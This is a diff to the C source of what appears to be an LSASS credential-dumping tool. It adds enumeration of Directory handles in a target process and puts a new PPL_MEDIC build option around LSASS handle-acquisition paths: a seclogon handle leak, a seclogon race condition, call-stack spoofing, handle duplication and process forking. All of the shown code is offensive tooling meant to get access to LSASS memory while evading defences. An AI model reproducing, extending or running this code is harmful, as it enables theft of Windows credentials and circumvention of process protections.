@@ -5,7 +5,7 @@
 #include "malseclogon.h"
 #include "spoof_callstack.h"
 
-#if defined(NANO) && !defined(SSP)
+#if (defined(NANO) || defined(PPL_MEDIC)) && !defined(SSP)
 
 BOOL find_token_handles_in_process(
     IN DWORD process_pid,
@@ -124,6 +124,78 @@ BOOL find_process_handles_in_process(
 
         // make sure the handle is of type 'Process'
         if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
+            continue;
+
+        if (handle_list->Count + 1 > MAX_HANDLES)
+        {
+            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
+            goto cleanup;
+        }
+        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
+    }
+
+    *phandle_list = handle_list;
+    ret_val = TRUE;
+    DPRINT("Found %ld handles", handle_list->Count);
+
+cleanup:
+    if (handleTableInformation)
+    {
+        DATA_FREE(handleTableInformation, handleTableInformationSize);
+    }
+    if (!ret_val && handle_list)
+    {
+        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
+    }
+
+    return ret_val;
+}
+
+BOOL find_directory_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions,
+    OUT PHANDLE_LIST* phandle_list)
+{
+    BOOL ret_val = FALSE;
+    BOOL success = FALSE;
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
+    ULONG handleTableInformationSize = 0;
+    ULONG DirectoryTypeIndex = 0;
+
+    DPRINT("Finding directory handles in the process with PID %ld", process_pid);
+
+    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
+    if (!handle_list)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    success = get_type_index_by_name(DIRECTORY_HANDLE_TYPE, &DirectoryTypeIndex);
+    if (!success)
+        goto cleanup;
+
+    success = get_all_handles(
+        &handleTableInformation,
+        &handleTableInformationSize);
+    if (!success)
+        goto cleanup;
+
+    // loop over each handle
+    for (ULONG j = 0; j < handleTableInformation->Count; j++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
+
+        // make sure this handle is from the target process
+        if (handleInfo->UniqueProcessId != process_pid)
+            continue;
+
+        // make sure the handle has the permissions we need
+        if ((handleInfo->GrantedAccess & permissions) != permissions)
+            continue;
+
+        // make sure the handle is of type 'Directory'
+        if (handleInfo->ObjectTypeIndex != DirectoryTypeIndex)
             continue;
 
         if (handle_list->Count + 1 > MAX_HANDLES)
@@ -292,6 +364,8 @@ cleanup:
     return hHighPriv;
 }
 
+#if defined(NANO)
+
 // get a handle to LSASS via multiple methods
 BOOL obtain_lsass_handle(
     OUT PHANDLE phProcess,
@@ -333,6 +407,7 @@ BOOL obtain_lsass_handle(
 
     if (use_seclogon_leak && !is_seclogon_leak_local_stage_2)
     {
+#if !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         success = malseclogon_handle_leak(
             seclogon_leak_remote_binary,
             dump_path,
@@ -347,6 +422,7 @@ BOOL obtain_lsass_handle(
             goto cleanup;
         if (use_seclogon_leak_local)
             return TRUE;
+#endif
     }
 
     // --seclogon-leak-remote requires --duplicate internaly
@@ -465,7 +541,7 @@ HANDLE open_handle_to_lsass(
     if (is_malseclogon_stage_2)
     {
         // this is always done from an EXE
-#ifdef EXE
+#if defined(EXE) && defined(NANO) && !defined(SSP) && !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = malseclogon_stage_2();
 #endif
     }
@@ -480,18 +556,22 @@ HANDLE open_handle_to_lsass(
     }
     else if (seclogon_race)
     {
+#if defined(NANO) && !defined(SSP) && !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = malseclogon_race_condition(
             lsass_pid,
             permissions,
             attributes);
+#endif
     }
     else if (spoof_callstack)
     {
+#if !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = open_handle_with_spoofed_callstack(
             spoof_callstack,
             lsass_pid,
             permissions,
             attributes);
+#endif
     }
     // good old NtOpenProcess
     else if (lsass_pid)
@@ -551,6 +631,8 @@ HANDLE find_lsass(
             return hProcess;
     }
 }
+
+#endif
 
 // use NtOpenProcess to get a handle to a process
 HANDLE get_process_handle(
@@ -814,6 +896,8 @@ cleanup:
     return ret_val;
 }
 
+#if defined(NANO)
+
 // find and duplicate a handle to LSASS
 HANDLE duplicate_lsass_handle(
     IN DWORD lsass_pid,
@@ -951,6 +1035,8 @@ cleanup:
     else
         return NULL;
 }
+
+#endif
 
 // create a clone (fork) of the LSASS process
 HANDLE fork_process(
